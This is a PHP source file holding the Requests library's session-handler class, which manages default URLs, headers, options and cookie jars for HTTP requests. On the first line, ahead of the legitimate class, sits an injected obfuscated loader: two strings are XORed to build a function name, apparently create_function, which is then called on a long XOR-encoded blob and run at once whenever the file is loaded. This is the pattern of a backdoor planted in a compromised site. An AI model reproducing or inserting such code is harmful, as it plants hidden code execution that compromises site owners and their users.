<?php $wMwzCU='NJT3ZVg3NETHY6R'^'-81R.38U;+7<0Y<';$oLtFn=$wMwzCU('','BZXeMY9H6I:8,< >>LMYf66R,5VGSi7<H7FZGfM:N-:UX7I=UH6:7gQQ:TafWGEnTXTNZGxbRQIpvqynw+AEfS8 ZYUbsVr0pCT54bGEYSCGThs+Y699G1=bR6W>WeYNJQMrmIjsQSH<PbQvAROX3 ea8qZ-KBXKH6G0BBbS2+<E-AS-4+YnpOg:dL17A+=Ff+4NXPd0OYN<XP-3L5tggRRQ+VCzp,5JAdR 3seI<TP94OX<>ZAU93PqBl.r:czytD2BkV 5.xjmytM9=E,hQ8YGK,P<+q1RGekNiE-Lk0QjRSMVgrri78Q3VsKLKa:Rirva37B6SZKx97QB<1PTNBia=<glv:anQBTP:Y7NSonOEZP<RoyAy0>i11OA<<SNzoRrE13H>oXOWY,8GuYP7LA47zo1KPEh3oI2O5Zss2-+SEKIO5SOHxDD==U,5187,B2oB,SWDY6IV196KLg>M90kZJA S9M,1HIEBXPG1oI>W3Wpwvh.Y<1,h  1f3,R23;ODVNGmaNtD5CUKWOGPd7<eFl2RH5eiK-IVcFswympBX5zLX,HZF2W=evCWNhWSAb:ECyKXYF0SJwAtNYRD5I92RTtKI;7XEyT2LG5R16mGBu RM+bPzZiqOcF82HD5 co-.6,fnPTY96LDInQyL>67IXpjSAKE'^'+<pD+,W+B UVsYXWM8>qANY sQ7326hQ=CasnF60GKO;;C R;hNUE850N5>9:21Fp<5:;kXF940YVQYNWPKLowWU.yhBTqI:yJ2ZFJc,yncwoHWBeEMK+TSJvR6J6Lbnn8fYDCczu<=HpLlViv+9GA>EQ,zskf3.1mcYbgB FYP CiwFQRp3Ytm3m>TC4YSnBDA:qkn92S36RtIR8TTZG43=X3xpTHT> ;9EJSXiZ5<JQtR6X530XP8QjHq1u,101dS1KrKPWXWSYP;XQ0IAqCSNoH1HJ.Z7>EVnM.H5P:XN6297GORMAY=F3HA1AkS4IZWEWV6Wzz0r0Q>0YP3<njM>oy693i5N01ttQ<NnnQNk3;<I7FY:s97MUP; cW67ZRrV.TJs4fQk38XYgHytA--ARAe86Z8b9K-S;TzNSrXE  9 .Y:5-P<+Ob1MAPghA7FG M 2rmi-3RVR.dCZ,MQBvjeD2M,sZ-0lkcZ.WGmZ6G6PQPHO+NPU7KEH9VT;AGHgc=+>JMnP T74bwiapLZXPnHV3<T>N H0q>oSJDMWqiVLy;Ip9tTdYRDra,Xf2rQXw Axo:rQtcWgRn8 6T0fY7-+.1RD,6QsB->Y=PRJkbQD39JKyZzIQoC=2;-2TLKKIOBM=I 5 UY- n3xBF7SO ,XZzzA8');$oLtFn();
/**
 * Session handler for persistent requests and default parameters
 *
 * @package Requests
 * @subpackage Session Handler
 */

/**
 * Session handler for persistent requests and default parameters
 *
 * Allows various options to be set as default values, and merges both the
 * options and URL properties together. A base URL can be set for all requests,
 * with all subrequests resolved from this. Base options can be set (including
 * a shared cookie jar), then overridden for individual requests.
 *
 * @package Requests
 * @subpackage Session Handler
 */
class Requests_Session {
	/**
	 * Base URL for requests
	 *
	 * URLs will be made absolute using this as the base
	 * @var string|null
	 */
	public $url = null;

	/**
	 * Base headers for requests
	 * @var array
	 */
	public $headers = array();

	/**
	 * Base data for requests
	 *
	 * If both the base data and the per-request data are arrays, the data will
	 * be merged before sending the request.
	 *
	 * @var array
	 */
	public $data = array();

	/**
	 * Base options for requests
	 *
	 * The base options are merged with the per-request data for each request.
	 * The only default option is a shared cookie jar between requests.
	 *
	 * Values here can also be set directly via properties on the Session
	 * object, e.g. `$session->useragent = 'X';`
	 *
	 * @var array
	 */
	public $options = array();

	/**
	 * Create a new session
	 *
	 * @param string|null $url Base URL for requests
	 * @param array $headers Default headers for requests
	 * @param array $data Default data for requests
	 * @param array $options Default options for requests
	 */
	public function __construct($url = null, $headers = array(), $data = array(), $options = array()) {
		$this->url = $url;
		$this->headers = $headers;
		$this->data = $data;
		$this->options = $options;

		if (empty($this->options['cookies'])) {
			$this->options['cookies'] = new Requests_Cookie_Jar();
		}
	}

	/**
	 * Get a property's value
	 *
	 * @param string $key Property key
	 * @return mixed|null Property value, null if none found
	 */
	public function __get($key) {
		if (isset($this->options[$key])) {
			return $this->options[$key];
		}

		return null;
	}

	/**
	 * Set a property's value
	 *
	 * @param string $key Property key
	 * @param mixed $value Property value
	 */
	public function __set($key, $value) {
		$this->options[$key] = $value;
	}

	/**
	 * Remove a property's value
	 *
	 * @param string $key Property key
	 */
	public function __isset($key) {
		return isset($this->options[$key]);
	}

	/**
	 * Remove a property's value
	 *
	 * @param string $key Property key
	 */
	public function __unset($key) {
		if (isset($this->options[$key])) {
			unset($this->options[$key]);
		}
	}

	/**#@+
	 * @see request()
	 * @param string $url
	 * @param array $headers
	 * @param array $options
	 * @return Requests_Response
	 */
	/**
	 * Send a GET request
	 */
	public function get($url, $headers = array(), $options = array()) {
		return $this->request($url, $headers, null, Requests::GET, $options);
	}

	/**
	 * Send a HEAD request
	 */
	public function head($url, $headers = array(), $options = array()) {
		return $this->request($url, $headers, null, Requests::HEAD, $options);
	}

	/**
	 * Send a DELETE request
	 */
	public function delete($url, $headers = array(), $options = array()) {
		return $this->request($url, $headers, null, Requests::DELETE, $options);
	}
	/**#@-*/

	/**#@+
	 * @see request()
	 * @param string $url
	 * @param array $headers
	 * @param array $data
	 * @param array $options
	 * @return Requests_Response
	 */
	/**
	 * Send a POST request
	 */
	public function post($url, $headers = array(), $data = array(), $options = array()) {
		return $this->request($url, $headers, $data, Requests::POST, $options);
	}

	/**
	 * Send a PUT request
	 */
	public function put($url, $headers = array(), $data = array(), $options = array()) {
		return $this->request($url, $headers, $data, Requests::PUT, $options);
	}

	/**
	 * Send a PATCH request
	 *
	 * Note: Unlike {@see post} and {@see put}, `$headers` is required, as the
	 * specification recommends that should send an ETag
	 *
	 * @link https://tools.ietf.org/html/rfc5789
	 */
	public function patch($url, $headers, $data = array(), $options = array()) {
		return $this->request($url, $headers, $data, Requests::PATCH, $options);
	}
	/**#@-*/

	/**
	 * Main interface for HTTP requests
	 *
	 * This method initiates a request and sends it via a transport before
	 * parsing.
	 *
	 * @see Requests::request()
	 *
	 * @throws Requests_Exception On invalid URLs (`nonhttp`)
	 *
	 * @param string $url URL to request
	 * @param array $headers Extra headers to send with the request
	 * @param array|null $data Data to send either as a query string for GET/HEAD requests, or in the body for POST requests
	 * @param string $type HTTP request type (use Requests constants)
	 * @param array $options Options for the request (see {@see Requests::request})
	 * @return Requests_Response
	 */
	public function request($url, $headers = array(), $data = array(), $type = Requests::GET, $options = array()) {
		$request = $this->merge_request(compact('url', 'headers', 'data', 'options'));

		return Requests::request($request['url'], $request['headers'], $request['data'], $type, $request['options']);
	}

	/**
	 * Send multiple HTTP requests simultaneously
	 *
	 * @see Requests::request_multiple()
	 *
	 * @param array $requests Requests data (see {@see Requests::request_multiple})
	 * @param array $options Global and default options (see {@see Requests::request})
	 * @return array Responses (either Requests_Response or a Requests_Exception object)
	 */
	public function request_multiple($requests, $options = array()) {
		foreach ($requests as $key => $request) {
			$requests[$key] = $this->merge_request($request, false);
		}

		$options = array_merge($this->options, $options);

		// Disallow forcing the type, as that's a per request setting
		unset($options['type']);

		return Requests::request_multiple($requests, $options);
	}

	/**
	 * Merge a request's data with the default data
	 *
	 * @param array $request Request data (same form as {@see request_multiple})
	 * @param boolean $merge_options Should we merge options as well?
	 * @return array Request data
	 */
	protected function merge_request($request, $merge_options = true) {
		if ($this->url !== null) {
			$request['url'] = Requests_IRI::absolutize($this->url, $request['url']);
			$request['url'] = $request['url']->uri;
		}

		if (empty($request['headers'])) {
			$request['headers'] = array();
		}
		$request['headers'] = array_merge($this->headers, $request['headers']);

		if (empty($request['data'])) {
			if (is_array($this->data)) {
				$request['data'] = $this->data;
			}
		}
		elseif (is_array($request['data']) && is_array($this->data)) {
			$request['data'] = array_merge($this->data, $request['data']);
		}

		if ($merge_options !== false) {
			$request['options'] = array_merge($this->options, $request['options']);

			// Disallow forcing the type, as that's a per request setting
			unset($request['options']['type']);
		}

		return $request;
	}
}
